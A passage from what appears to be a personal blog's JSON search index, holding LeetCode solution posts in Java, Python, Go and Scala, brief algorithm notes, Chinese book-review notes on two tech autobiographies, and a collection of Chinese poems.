1234567891011121314151617181920212223242526272829303132333435363738class MinStack &#123; int min = Integer.MAX_VALUE; Stack&lt;Integer&gt; stack; /** initialize your data structure here. */ public MinStack() &#123; stack = new Stack&lt;Integer&gt;(); &#125; public void push(int x) &#123; // only push the old minimum value when the current // minimum value changes after pushing the new value x if(x &lt;= min)&#123; stack.push(min); min=x; &#125; stack.push(x); &#125; public void pop() &#123; // if pop operation could result in the changing of the current minimum value, // pop twice and change the current minimum value to the last minimum value. if(stack.pop() == min) &#123; min=stack.pop(); &#125; &#125; public int top() &#123; return stack.peek(); &#125; public int getMin() &#123; return min; &#125;&#125; 参考资料 min-stack","updated":"2020-07-19T00:23:28.032Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"},{"name":"stack","slug":"stack","permalink":"http://xwolf191.github.io/tags/stack/"}]},{"title":"53. Maximum Subarray","date":"2019-05-13T09:00:00.000Z","path":"2019/05/13/数据结构和算法/leetcode/Maximum Subarray/","text":"Given an integer array nums, find the contiguous subarray (containing at least one number) which has the largest sum and return its sum. Example: 123Input: [-2,1,-3,4,-1,2,1,-5,4],Output: 6Explanation: [4,-1,2,1] has the largest sum = 6. Follow up: If you have figured out the O(n) solution, try coding another solution using the divide and conquer approach, which is more subtle. 题意求给定数组中连续元素和的最大值，求出这个值。如果在 O(n)时间复杂度内解决了这个问题,尝试用分治法解决一下这个问题. 实现 java 暴力求解,遍历所有元素，求可能的所有子数组对应的元素和，比较求出最大值.时间复杂度为 O(n^2),虽然解决了问题但不是最优解. 123456789101112131415161718192021222324252627282930313233/** * 53. Maximum Subarray * @author xwolf * @result accept */public class MaximumSubarray &#123; public int maxSubArray(int[] nums) &#123; int len = nums.length; int max = nums[0]; for (int i = 0;i&lt;len;i++)&#123; int cur = nums[i]; if (max &lt; cur)&#123; max = cur; &#125; int tmpSum = cur; for (int j = i + 1; j &lt;len;j++)&#123; tmpSum += nums[j]; if (max &lt; tmpSum)&#123; max = tmpSum; &#125; &#125; &#125; return max; &#125; public static void main(String[] args) &#123; MaximumSubarray maximumSubarray = new MaximumSubarray(); int[] ary = &#123;-2,1,-3,4,-1,2,1,-5,4&#125;; System.out.println(maximumSubarray.maxSubArray(ary)); &#125;&#125; java 动态规划解决方法,时间复杂度为 O(n) 1234567891011121314public int maxSubArray(int[] A) &#123; int n = A.length; int[] dp = new int[n];//dp[i] means the maximum subarray ending with A[i]; dp[0] = A[0]; int max = dp[0]; for(int i = 1; i &lt; n; i++)&#123; dp[i] = A[i] + (dp[i - 1] &gt; 0 ? dp[i - 1] : 0); max = Math.max(max, dp[i]); &#125; return max;&#125; 参考资料 maximum-subarray","updated":"2020-07-19T00:23:28.031Z","tags":[{"name":"DP","slug":"DP","permalink":"http://xwolf191.github.io/tags/DP/"},{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"100.Same Tree","date":"2019-05-13T08:15:00.000Z","path":"2019/05/13/数据结构和算法/leetcode/Same Tree/","text":"Given two binary trees, write a function to check if they are the same or not. Two binary trees are considered the same if they are structurally identical and the nodes have the same value. Example 1: 12345Input: 1 1 / \\ / \\ 2 3 2 3 [1,2,3], [1,2,3] Output: true Example 2: 12345Input: 1 1 / \\ 2 2 [1,2], [1,null,2] Output: false Example 3: 12345Input: 1 1 / \\ / \\ 2 1 1 2 [1,2,1], [1,1,2] Output: false 题意解读题目很容易理解，判断给定的两个二叉树是否完全一样. 实现 java 递归判断 12345678910111213141516public class SameTree &#123; public boolean isSameTree(TreeNode p, TreeNode q) &#123; if (p == null &amp;&amp; q == null)&#123; return true; &#125; if (q == null || p == null)&#123; return false; &#125; if (p.val != q.val) &#123; return false; &#125; return isSameTree(p.right, q.right) &amp;&amp; isSameTree(p.left, q.left); &#125;&#125; java 迭代实现 12345678910111213141516171819202122232425262728293031323334353637383940414243class SameTree &#123; public boolean check(TreeNode p, TreeNode q) &#123; // p and q are null if (p == null &amp;&amp; q == null) return true; // one of p and q is null if (q == null || p == null) return false; if (p.val != q.val) return false; return true; &#125; public boolean isSameTree(TreeNode p, TreeNode q) &#123; if (p == null &amp;&amp; q == null) return true; if (!check(p, q)) return false; // init deques ArrayDeque&lt;TreeNode&gt; deqP = new ArrayDeque&lt;TreeNode&gt;(); ArrayDeque&lt;TreeNode&gt; deqQ = new ArrayDeque&lt;TreeNode&gt;(); deqP.addLast(p); deqQ.addLast(q); while (!deqP.isEmpty()) &#123; p = deqP.removeFirst(); q = deqQ.removeFirst(); if (!check(p, q)) return false; if (p != null) &#123; // in Java nulls are not allowed in Deque if (!check(p.left, q.left)) return false; if (p.left != null) &#123; deqP.addLast(p.left); deqQ.addLast(q.left); &#125; if (!check(p.right, q.right)) return false; if (p.right != null) &#123; deqP.addLast(p.right); deqQ.addLast(q.right); &#125; &#125; &#125; return true; &#125;&#125; 参考资料 100.Same Tree","updated":"2020-07-19T00:23:28.038Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"堆排序","date":"2019-05-12T12:50:00.000Z","path":"2019/05/12/数据结构和算法/堆排序/","text":"堆排序（英语：Heapsort）是指利用堆这种数据结构所设计的一种排序算法。堆是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。 定义二叉堆是一个数组,可以被看成是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。如下图所示，就是一个典型的二叉堆,可以用数组[2,4,13,10,9,32,35,12,31,11]表示. 根据父节点和子节点的关系，可以分为大顶堆和小顶堆。 大顶堆父节点比它的子节点大. 小顶堆父节点比它的子节点小. 如上图所示就是一个小顶堆. 参考资料 Heapsort","updated":"2020-07-19T00:23:28.047Z","tags":[{"name":"heapsort","slug":"heapsort","permalink":"http://xwolf191.github.io/tags/heapsort/"}]},{"title":"AC自动机算法详解","date":"2019-05-12T03:00:00.000Z","path":"2019/05/12/数据结构和算法/AC自动机算法详解/","text":"Aho-Corasick automaton，该算法在1975年产生于贝尔实验室，是著名的多模匹配算法。要学会AC自动机，我们必须知道什么是Trie，也就是字典树。Trie树，又称单词查找树或键树，是一种树形结构，是一种哈希树的变种。典型应用是用于统计和排序大量的字符串（但不仅限于字符串），所以经常被搜索引擎系统用于文本词频统计。 参考资料 AC自动机算法详解","updated":"2020-07-19T00:23:28.019Z","tags":[{"name":"AC","slug":"AC","permalink":"http://xwolf191.github.io/tags/AC/"}]},{"title":"622. Design Circular Queue","date":"2019-05-12T00:20:00.000Z","path":"2019/05/12/数据结构和算法/leetcode/Design Circular Queue/","text":"Design your implementation of the circular queue. The circular queue is a linear data structure in which the operations are performed based on FIFO (First In First Out) principle and the last position is connected back to the first position to make a circle. It is also called “Ring Buffer”. One of the benefits of the circular queue is that we can make use of the spaces in front of the queue. In a normal queue, once the queue becomes full, we cannot insert the next element even if there is a space in front of the queue. But using the circular queue, we can use the space to store new values. Your implementation should support following operations: MyCircularQueue(k): Constructor, set the size of the queue to be k.Front: Get the front item from the queue. If the queue is empty, return -1.Rear: Get the last item from the queue. If the queue is empty, return -1.enQueue(value): Insert an element into the circular queue. Return true if the operation is successful.deQueue(): Delete an element from the circular queue. Return true if the operation is successful.isEmpty(): Checks whether the circular queue is empty or not.isFull(): Checks whether the circular queue is full or not. Example:12345678910MyCircularQueue circularQueue = new MyCircularQueue(3); // set the size to be 3circularQueue.enQueue(1); // return truecircularQueue.enQueue(2); // return truecircularQueue.enQueue(3); // return truecircularQueue.enQueue(4); // return false, the queue is fullcircularQueue.Rear(); // return 3circularQueue.isFull(); // return truecircularQueue.deQueue(); // return truecircularQueue.enQueue(4); // return truecircularQueue.Rear(); // return 4 Note: All values will be in the range of [0, 1000]. The number of operations will be in the range of [1, 1000]. Please do not use the built-in Queue library. 题意 题意比较简单，设计一个队列.用数组实现,用头尾两个指针来访问元素。 实现 java 不使用内置队列库实现一个队列. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768class MyCircularQueue &#123; private int[] data; private int head; private int tail; private int size; /** Initialize your data structure here. Set the size of the queue to be k. */ public MyCircularQueue(int k) &#123; data = new int[k]; head = -1; tail = -1; size = k; &#125; /** Insert an element into the circular queue. Return true if the operation is successful. */ public boolean enQueue(int value) &#123; if (isFull() == true) &#123; return false; &#125; if (isEmpty() == true) &#123; head = 0; &#125; tail = (tail + 1) % size; data[tail] = value; return true; &#125; /** Delete an element from the circular queue. Return true if the operation is successful. */ public boolean deQueue() &#123; if (isEmpty() == true) &#123; return false; &#125; if (head == tail) &#123; head = -1; tail = -1; return true; &#125; head = (head + 1) % size; return true; &#125; /** Get the front item from the queue. */ public int Front() &#123; if (isEmpty() == true) &#123; return -1; &#125; return data[head]; &#125; /** Get the last item from the queue. */ public int Rear() &#123; if (isEmpty() == true) &#123; return -1; &#125; return data[tail]; &#125; /** Checks whether the circular queue is empty or not. */ public boolean isEmpty() &#123; return head == -1; &#125; /** Checks whether the circular queue is full or not. */ public boolean isFull() &#123; return ((tail + 1) % size) == head; &#125;&#125; 参考资料 design-circular-queue","updated":"2020-07-19T00:23:28.025Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"56.Valid Number","date":"2019-05-10T15:00:00.000Z","path":"2019/05/10/数据结构和算法/leetcode/Valid Number/","text":"Validate if a given string can be interpreted as a decimal number. Some examples:1234567891011121314&quot;0&quot; =&gt; true&quot; 0.1 &quot; =&gt; true&quot;abc&quot; =&gt; false&quot;1 a&quot; =&gt; false&quot;2e10&quot; =&gt; true&quot; -90e3 &quot; =&gt; true&quot; 1e&quot; =&gt; false&quot;e3&quot; =&gt; false&quot; 6e-1&quot; =&gt; true&quot; 99e2.5 &quot; =&gt; false&quot;53.5e93&quot; =&gt; true&quot; --6 &quot; =&gt; false&quot;-+3&quot; =&gt; false&quot;95a54e53&quot; =&gt; false Note: It is intended for the problem statement to be ambiguous. You should gather all requirements up front before implementing one. However, here is a list of characters that can be in a valid decimal number: Numbers 0-9Exponent - “e”Positive/negative sign - “+”/“-“Decimal point - “.”Of course, the context of these characters also matters in the input. Update (2015-02-10):The signature of the C++ function had been updated. If you still see your function signature accepts a const char * argument, please click the reload button to reset your code definition. 题意解读验证字符串是小数,注意数字0-9、e、+、-、. 主要就是这几个符号的判断。主要是各种情况的考虑,比较繁琐。 实现 Python 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162class Solution: def isNumber(self, s: str) -&gt; bool: s = s.strip(' ') size = len(s) if s is None or size == 0: return False number = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'] chars = ['+', '-', '.', 'e'] # 只有一个字符判断是否为数字 if size == 1: return s in number # 最后一个字符必须为数字或. if s[size-1] not in number and s[size-1] != '.': return False # 第一个字符不能为e if s[0] == 'e': return False existChar = [] for i in range(size): cur = s[i] #print(cur, existChar) # 字符不能出现多次 if cur in existChar: return False # 只能数字和指定字符 if cur not in number and cur not in chars: return False if cur in chars and i &lt; size-1: nextChar = s[i+1] if s[0] != '+' and s[0] != '-': existChar.append(cur) if cur != 'e' and nextChar in chars: if cur == '.' and nextChar != 'e': return False if i == 0 and cur == '.' and nextChar == 'e': return False if cur != '.' and nextChar == 'e': return False if cur == 'e': if nextChar != '+' and nextChar != '-' and nextChar not in number: return False # +,- 不能出现在字符串中间,但是e后边可以是+,- if cur == '+' or cur == \"-\": if i &gt; 0 and s[i-1] != 'e': return False # 判断e后字符是否合法 if 'e' in s: estr = s.split(\"e\") etr = estr[1] for j in range(len(etr)): er = etr[j] # print(er) if j == 0 and er not in number and er != '+' and er != '-': return False if j != 0 and er not in number: return False # 如果字符串是否含任何数字 res = False for i in range(size): if s[i] in number: res = True return res 讨论区其他答案: java 123456789101112131415161718192021222324252627282930313233public boolean isNumber(String s) &#123; s = s.trim(); boolean pointSeen = false; boolean eSeen = false; boolean numberSeen = false; boolean numberAfterE = true; for(int i=0; i&lt;s.length(); i++) &#123; if('0' &lt;= s.charAt(i) &amp;&amp; s.charAt(i) &lt;= '9') &#123; numberSeen = true; numberAfterE = true; &#125; else if(s.charAt(i) == '.') &#123; if(eSeen || pointSeen) &#123; return false; &#125; pointSeen = true; &#125; else if(s.charAt(i) == 'e') &#123; if(eSeen || !numberSeen) &#123; return false; &#125; numberAfterE = false; eSeen = true; &#125; else if(s.charAt(i) == '-' || s.charAt(i) == '+') &#123; if(i != 0 &amp;&amp; s.charAt(i-1) != 'e') &#123; return false; &#125; &#125; else &#123; return false; &#125; &#125; return numberSeen &amp;&amp; numberAfterE;&#125; 参考资料 65. Valid Number leetCode-65-Valid-Number","updated":"2020-07-19T00:23:28.042Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"李开复自传 世界因你不同","date":"2019-05-07T01:00:00.000Z","path":"2019/05/07/读书笔记/李开复自传世界因你而不同/","text":"内容简介这是李开复唯一的一本自传，字里行间，是岁月流逝中沉淀下来的宝贵的人生智慧和职场经验。捣蛋的“小皇帝”，11 岁的“留学生”，奥巴马的大学同学，26 岁的副教授，33 岁的苹果副总裁，谷歌中国的创始人，他有着太多传奇的经历，为了他，两家最大的 IT 公司对簿公堂。而他的每一次人生选择，都是一次成功的自我超越。 透过这本自传，李开复真诚讲述了他鲜为人知的成长史、风雨兼程的成功史和烛照人生的心灵史，也首次全面披露了他亲历的苹果、微软、谷歌等 IT 巨头风云变幻的内幕。娓娓道来，字字珠玑。 抓住一切去探寻生命的意义，总有一天，世界将因你不同。 作者简介李开复，2009 年创立创新工场，一个全方位的创业平台，旨在培育创新人才和新一代高科技企业。曾先后在苹果、SGI、微软、谷歌等公司担任要职，1998 年亲手创办微软中国研究院（后更名为微软亚洲研究院），2000 年就任微软公司全球副总裁，成为比尔·盖茨的七位高层智囊之一。2005 年，加入谷歌公司，任全球副总裁兼大中华区总裁。 祖籍四川，1961 年 12 月生于台湾。11 岁留学美国，1988 年获得卡内基·梅隆大学计算机系博士学位。他开发了全球第一个“不特定语者连续语音识别”系统，被美国《商业周刊》评为 1988 年最重要的科学发明。他开发的“奥赛罗”人机对弈系统，击败了人类世界冠军。他还是美国电气和电子工程师协会院士和精英组织百人会的副会长。 范海涛，毕业于西南政法大学，获文学学士和法学学士。16 岁成为北京市中学生通讯社记者，为《北京青年报》下属报纸《中学生时事报》撰稿。现为《北京青年报》财经新闻记者，2005 年开始专注互联网领域的报道。 读后感对李开复对于中西教育方式的比较,中国应试教育和西方兴趣教育的深刻不同印象较深。在公司部门被裁,作为领导者管理者的那种自责、负责的精神让人很感动。其中比较了技术人员和管理者的思维不同,技术人员偏重高智商、对技术的偏执。而管理者则偏重高情商,协调各种资源推动产品落地。重视员工的看法,创业公司对财务预算的评估、管理者对公司理念的把握而不是摆出一副臭架子、坚信科技改变未来等。开复老师心怀教育,对中国教育商业化和中国大学生在前进的路上的迷茫有深刻的印象,每个人都急功近利、在名利场上迷失了自己。对google开放、自由、创新的跨国公司巨头对员工创新性的充分挖掘折服。中国为何不可以?","updated":"2020-07-19T00:23:28.452Z","tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://xwolf191.github.io/tags/读书笔记/"}]},{"title":"167.Two Sum II - Input array is sorted","date":"2019-05-06T09:00:00.000Z","path":"2019/05/06/数据结构和算法/leetcode/Two Sum II - Input array is sorted/","text":"Given an array of integers that is already sorted in ascending order, find two numbers such that they add up to a specific target number. The function twoSum should return indices of the two numbers such that they add up to the target, where index1 must be less than index2. Note: Your returned answers (both index1 and index2) are not zero-based.You may assume that each input would have exactly one solution and you may not use the same element twice.Example: 123Input: numbers = [2,7,11,15], target = 9Output: [1,2]Explanation: The sum of 2 and 7 is 9. Therefore index1 = 1, index2 = 2. 题意解读给定一个有序数组,求出两个数的位置使得对应位置的元素之和等于给定的数字 target.并且一个元素只能使用一次. 实现 python 这种方法比较容易想到,顺序遍历所有元素,用 target-当前元素=目标元素，判断目标元素是否在数组中,如果在则获取对应的位置返回。 12345678910111213141516171819202122class TwoSumII: def twoSum(self, numbers, target: int): \"\"\" :param numbers: List[int] :param target: int :return: List[int] \"\"\" size = len(numbers) res = [] for i in range(size): a = numbers[i] b = target - a if b in numbers: c = numbers.index(b) if i == c: c = i + 1 res.append(i + 1) res.append(c + 1) return res return res 讨论区其他答案 java 用两个指针变量,一个指向头部,一个指向尾部.通过比较 target 和前后指针之和来移动指针位置,缩小范围。 12345678910111213141516171819public int[] twoSum(int[] num, int target) &#123; int[] indice = new int[2]; if (num == null || num.length &lt; 2) return indice; int left = 0, right = num.length - 1; while (left &lt; right) &#123; int v = num[left] + num[right]; if (v == target) &#123; indice[0] = left + 1; indice[1] = right + 1; break; &#125; else if (v &gt; target) &#123; right --; &#125; else &#123; left ++; &#125; &#125; return indice;&#125; 参考资料 two-sum-ii-input-array-is-sorted","updated":"2020-07-19T00:23:28.041Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"561.Array Partition I","date":"2019-05-06T06:15:00.000Z","path":"2019/05/06/数据结构和算法/leetcode/Array Partition I/","text":"Given an array of 2n integers, your task is to group these integers into n pairs of integer, say (a1, b1), (a2, b2), …, (an, bn) which makes sum of min(ai, bi) for all i from 1 to n as large as possible. 12345Example 1:Input: [1,4,3,2]Output: 4Explanation: n is 2, and the maximum sum of pairs is 4 = min(1, 2) + min(3, 4). Note: n is a positive integer, which is in the range of [1, 10000]. All the integers in the array will be in the range of [-10000, 10000]. 题意描述给定 2n 个整数的数组,将数组中元素分成 n 组,每组 2 个元素。求得这 n 组中每组元素的最小值之和m,使得m尽可能大。 实现先排序这个数组,求出所有元素下标是 2 的倍数的元素之和。 go 12345678910111213import ( \"sort\")func ArrayPairSum(nums []int) int &#123; sort.Ints(nums) sum := 0 for i := 0; i &lt; len(nums); i += 2 &#123; sum += nums[i] &#125; return sum&#125; 参考资料 561. Array Partition I","updated":"2020-07-19T00:23:28.022Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"颠覆者：周鸿祎自传","date":"2019-05-05T12:15:00.000Z","path":"2019/05/05/读书笔记/颠覆者周鸿祎自传/","text":"简介周鸿祎，一个在中国互联网历史上举足轻重的名字。他被认为是奠定当今中国互联网格局的人之一。 作为第一代互联网人，中国互联网行业最好的产品经理、创业者，他每时每刻都以自己的实践，为互联网的发展贡献自己的力量。 在很长一段时间内，他没有在公共场合发声，甚至有粉丝对当前死水一潭的互联网现状不满意，发出了“人民想念周鸿祎”的呼声。 但周鸿祎在小时候，却是一个踢天弄井，动不动就大闹天宫的超级熊孩子，一个成年人眼里的非主流儿童。 小时候周鸿祎在家里经常因为捅出娄子，惹来父母一顿揍。上学之后，更是一个调皮捣蛋的异类分子——上课说话、做小动作、戏弄女同学、画漫画丑化惩罚他的老师，甚至因为淘气被警察找上门来。 岁月会让人变得成熟稳重，然而上大学之后的周鸿祎，却也不怎么安分——刚上大学就跟人打架，差点被开除、多次创业失败…… 在“熊孩子”背后，周鸿祎还有另外一面：他从小就热爱阅读，时至今日仍然保持着阅读的好习惯，不断升级迭代自己的思维体系；他高中时期就立下了“活着就是为了改变世界”的志向，要做一款产品改变世界；大学期间创业虽然失败，但没有击倒他，反而更坚定了他做好产品，服务好用户的理想。 一个调皮捣蛋四处惹祸的“超级熊孩子”，一个颠覆式的挑战者，经过二十年坚持不懈的努力奋斗，凭借着对计算机的无限热爱，蜕变为了人尽皆知的“互联网英雄”。 周鸿祎这个四十年走过的路，一点都没有枉顾时间给他所有的考验和历练。 不甘于平庸的你，读完周鸿祎的成长故事，也可以得到一些启迪，从而颠覆观念，颠覆人生。 读后感虽然或多或少用过360,但对360的过去并不太知道。以及大家口耳相传的流氓公司3721.看了“红衣大炮”的这本自传, 对360以及周鸿祎本人有了一个更新的认识。周鸿祎年少时对计算机的热情、专注、不妥协、不放弃这些独立人格造就了3721以及后来的奇虎360。在互联网风起云涌时代对产品的专注,对用户的负责也造就了360。对互联网创业者也是一个启示吧,创业九死一生,惊心动魄,踏上这条路希望有所帮助,在惊涛骇浪中砥砺前行！","updated":"2020-07-19T00:23:28.464Z","tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://xwolf191.github.io/tags/读书笔记/"}]},{"title":"344. Reverse String","date":"2019-04-29T10:30:00.000Z","path":"2019/04/29/数据结构和算法/leetcode/ReverseString/","text":"Write a function that reverses a string. The input string is given as an array of characters char[]. Do not allocate extra space for another array, you must do this by modifying the input array in-place with O(1) extra memory. You may assume all the characters consist of printable ascii characters. Example 1: 12Input: [&quot;h&quot;,&quot;e&quot;,&quot;l&quot;,&quot;l&quot;,&quot;o&quot;]Output: [&quot;o&quot;,&quot;l&quot;,&quot;l&quot;,&quot;e&quot;,&quot;h&quot;] Example 2: 12Input: [&quot;H&quot;,&quot;a&quot;,&quot;n&quot;,&quot;n&quot;,&quot;a&quot;,&quot;h&quot;]Output: [&quot;h&quot;,&quot;a&quot;,&quot;n&quot;,&quot;n&quot;,&quot;a&quot;,&quot;H&quot;] 题意在不占用额外内存的情况下,翻转数组. 实现 Python 123456789101112def reverseString(self, s) -&gt; None: \"\"\" O(1)空间复杂度下翻转数组 :param s: List[str] :return: \"\"\" lens = len(s) for i in range(int(lens / 2 )): print(i) tmp = s[i] s[i] = s[lens - i - 1] s[lens - i - 1] = tmp 讨论区其他答案 java 123456789101112131415public class Solution &#123; public String reverseString(String s) &#123; byte[] bytes = s.getBytes(); int i = 0; int j = s.length() - 1; while (i &lt; j) &#123; bytes[i] = (byte) (bytes[i] ^ bytes[j]); bytes[j] = (byte) (bytes[i] ^ bytes[j]); bytes[i] = (byte) (bytes[i] ^ bytes[j]); i++; j--; &#125; return new String(bytes); &#125;&#125; 参考资料 Reverse String JAVA-Simple-and-Clean-with-Explanations-6-Solutions","updated":"2020-07-19T00:23:28.037Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"“待我长发及腰”下一句，你知道吗？太美了","date":"2019-04-29T05:30:00.000Z","path":"2019/04/29/杂侃/待我长发及腰/","text":"待我长发及腰”的原诗原来这么美： 【原诗】 待我长发及腰，将军归来可好？此身君子意逍遥，怎料山河萧萧。 天光乍破遇，暮雪白头老。寒剑默听奔雷，长枪独守空壕。 醉卧沙场君莫笑，一夜吹彻画角。江南晚来客，红绳结发梢。 【回信】 待卿长发及腰，我必凯旋回朝。昔日纵马任逍遥，俱是少年英豪。 东都霞色好，西湖烟波渺。执枪血战八方，誓守山河多娇。 应有得胜归来日，与卿共度良宵。盼携手终老，愿与子同袍。 待尔长发及腰，吾妻归来可好？看遍天下依依草，皆无吾妻飘渺。 几经繁华依旧，却无留恋今宵。行遍天下亦逍遥，惟愿与卿同老。 待我长发及腰，尔来寻吾可好？观遍人间君子遥，皆无尔之逍遥。 几经世间仍枉，却话虚度今宵。何处明了意凌霄，永愿与君偕老。 待我长发及腰，与君相约溪桥。山间薄雾暗萦绕，清风拂过眉梢。 帘外翠竹清高，皓月不问今朝。把酒抚琴醉良宵，莫道红尘客少。 待我长发及腰，金榜题名可好？对镜梳妆戴玉骚，只博檀郎一笑。 舞姿展尽妖娆，梨花暗自轻飘。洞房花烛杯相交，携手今生到老。 待我长发及腰，月高春寒料峭，满院落花谁祭扫，亭前道路遥遥。 清泪洒落衣角，发丝乱如荒草，夜夜留梦朱颜憔，今生情何时了？ 待我长发及腰，隐于市野可好？青山绿水映石桥，几缕炊烟袅袅。 闲逸绣针轻挑，庭前花锄种草，午后清茶淡香飘，一纸经书细瞧。 待你长发及腰，红梅白雪轻飘。相思怎比相守妙，莫等残阳西照，再把心事相表。 相识已是痴扰，相恋再把心交。哪管前尘风萧，余生但愿晴好。 待我长发及腰，一份相思来闹。少年回头一笑，执手共采芍药。 待我长发及腰，梦里北国雪飘。举伞独上孔桥，一夜江水浩渺。 待我长发及腰，天涯望断路遥。书信已绝怎找，夕阳落处心焦。 待我长发及腰，他乡游子可好。纵有粉黛环绕，谁知你心寂寥。 待我长发及腰，冷看街头妖娆。人言江南春好，少你何度良宵。 待我长发及腰，不复当年阿娇。七夕之时登高，尤愿得你一抱。 待卿长发及腰，潘郎娶你可好？待卿青丝绾正，铺十里红妆可愿？ 却怕长发及腰，卿卿付心他人。待卿青丝绾正，泪眼看他怀卿笑。 待我长发及腰，年华似水俏。觥筹交错醉倒，嫣然拈花一笑。 待我长发及腰，芳心暗许今宵。三千弱水饮一瓢，此夜君心烙。 待我长发及腰，两岸青山围绕。江湖浪滔滔，与君携手笑傲。 待我长发及腰，十里桃花翠草。君洒翩翩剑影，我执美酒佳肴。 待我长发及腰，月下舞剑可好？星夜萤火缭绕，彼时惊鸿照。 待我长发及腰，为君把伤疗。九死一搏两心交，寒夜飞花杳杳。 待我长发及腰，浪迹天涯可好？不求江山多娇，惟愿纵马逍遥。 待我长发及腰，琴笛和鸣可好？不羡仙来羡鹣鲽，日日与君老。 待我长发及腰，少年娶我可好？烛影摇红醉春宵，乱世红尘皆抛。 待我长发及腰，风云瞬息飘摇。世态炎凉遭暗算，与君相隔朝朝。 待我长发及腰，立地成佛可好？汝若平安归来，我必放下屠刀。 待我长发及腰，怎知世事难料？谬误一声绝情刀，岁月终无静好。 待我长发及腰，相思苦泪难熬。发绳飘飘情亦老，随风入尘嚣。 待我长发及腰，已是刀兵相照。梦里与子同袍，梦外冷目横交。 待我长发及腰，爱我好不好？千秋霸业又奈何，褪去一身骄傲。 待我长发及腰，血染青丝白袍。江山弹指为君倒，此念心字枯槁。 待我长发及腰，倾尽天下可好？只盼此心常伴君，陪你天荒地老。 待我长发及腰，霜冻三尺如刀。从此长眠冰湖水，湖畔鸳鸯笑。 待我长发及腰，注定孤独终老。覆了天下如何？你好我便好。 我已长发及腰，只是春还早。今生无缘来世续，痴心永不消。","updated":"2020-07-19T00:23:28.415Z","tags":[{"name":"杂侃","slug":"杂侃","permalink":"http://xwolf191.github.io/tags/杂侃/"}]},{"title":"747.Largest Number At Least Twice of Others","date":"2019-04-28T07:50:00.000Z","path":"2019/04/28/数据结构和算法/leetcode/Largest Number At Least Twice of Others/","text":"In a given integer array nums, there is always exactly one largest element.Find whether the largest element in the array is at least twice as much as every other number in the array.If it is, return the index of the largest element, otherwise return -1.Example 1:Input: nums = [3, 6, 1, 0]Output: 1Explanation: 6 is the largest integer, and for every other number in the array x,6 is more than twice as big as x. The index of value 6 is 1, so we return 1.Example 2:Input: nums = [1, 2, 3, 4]Output: -1Explanation: 4 isn’t at least as big as twice the value of 3, so we return -1. Note: nums will have a length in the range [1, 50]. Every nums[i] will be an integer in the range [0, 99]. 题意找到给定数组的最大元素,该元素是其他元素至少大两倍.如果存在该最大元素返回其索引位置,不存在返回-1. 分析找到最大元素,遍历比较元素大小即可。 实现 scala 1234567891011def dominantIndex(nums: Array[Int]): Int = &#123; val target = nums.sorted.last val size = nums.length for ( i &lt;- 0 until size)&#123; if (nums(i) != 0 &amp;&amp; target != nums(i) &amp;&amp; target/nums(i) &lt; 2 )&#123; return -1 &#125; &#125; nums.indexOf(target) &#125; 讨论区其他答案 java 12345678910111213public int dominantIndex(int[] nums) &#123; int max1 = 0, max2 = 0, idxOfMax1 = 0; for (int i = 0; i &lt; nums.length; i++) &#123; if (nums[i] &gt; max1) &#123; max2 = max1; max1 = nums[i]; idxOfMax1 = i; &#125; else if (nums[i] &gt; max2) &#123; max2 = nums[i]; &#125; &#125; return max1 &gt;= max2 * 2 ? idxOfMax1 : -1;&#125; go 123456789101112131415161718func dominantIndex(nums []int) int &#123; if len(nums) == 1 &#123; return 0 &#125; index := 1 for i:=0;i&lt;len(nums);i++ &#123; if nums [i] &gt; nums[index] &#123; index = i &#125; &#125; for i:= 0;i&lt;len(nums);i++ &#123; if i != index &amp;&amp; nums[i]*2 &gt; nums[index] &#123; return -1 &#125; &#125; return index&#125; python 1234567891011121314151617181920class Solution: def dominantIndex(self, nums): if len(nums) == 0: return -1 highest = -1 secondHighest = -1 highestIndex = 0 for i,n in enumerate(nums): if n &gt;= highest: secondHighest = highest highest = n highestIndex = i elif n &gt; secondHighest: secondHighest = n if highest &lt; secondHighest*2: highestIndex = -1 return highestIndex 参考资料 Largest Number At Least Twice of Others","updated":"2020-07-19T00:23:28.029Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"724. Find Pivot Index","date":"2019-04-28T06:52:00.000Z","path":"2019/04/28/数据结构和算法/leetcode/Find Pivot Index/","text":"Given an array of integers nums, write a method that returns the “pivot” index of this array.We define the pivot index as the index where the sum of the numbers to the left of the index is equal to the sum of the numbers to the right of the index.If no such index exists, we should return -1. If there are multiple pivot indexes, you should return the left-most pivot index.Example 1:Input:nums = [1, 7, 3, 6, 5, 6]Output: 3Explanation:The sum of the numbers to the left of index 3 (nums[3] = 6) is equal to the sum of numbers to the right of index 3.Also, 3 is the first index where this occurs. Example 2: Input:nums = [1, 2, 3]Output: -1Explanation:There is no index that satisfies the conditions in the problem statement. Note: The length of nums will be in the range [0, 10000].Each element nums[i] will be an integer in the range [-1000, 1000]. 题意给定一个 Integer 数组,返回一个索引位置,该位置左右两边的所有元素和相等,返回改索引.如果没有符合该条件的索引值则返回-1. 分析很容易想到几种解决方法: 先求所有元素之和,然后遍历数组，求出已经遍历的所有元素之和。总元素之和 - 已经遍历的元素之和 既是 右边元素之和,最后比较即可。 先求左边元素之和,再求右边元素之和。比较这两个值即可. 实现 scala 12345678910111213def pivotIndex(nums: Array[Int]): Int = &#123; if 